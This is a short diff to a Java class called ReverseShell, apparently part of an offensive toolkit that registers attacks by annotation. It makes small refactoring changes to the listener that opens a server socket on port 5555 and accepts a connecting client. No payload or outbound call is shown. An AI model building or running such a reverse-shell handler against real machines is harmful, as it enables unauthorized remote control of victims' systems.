@@ -17,7 +17,7 @@ import java.util.Scanner;
 @DefineAttack(name = "ReverseShell", attackType = AttackType.LOCAL_NETWORK)
 public class ReverseShell implements Attack {
 
-    public static Setting<Integer> port = new Setting<>("Port", 5555);
+    public static Setting<Integer> port = new Setting<Integer>("Port", 5555);
 
     public static ServerSocket server;
     public static Socket client;
@@ -33,8 +33,8 @@ public class ReverseShell implements Attack {
         guiThead.start();
 
         try {
-            server = new ServerSocket((int)port.getValue());
             System.out.println("Server started on port " + port.getValue() + "\n");
+            server = new ServerSocket(port.getValue());
             client = server.accept();
             System.out.println("Client connected from " + client.getInetAddress().getHostAddress() + "\n");
             input = client.getInputStream();
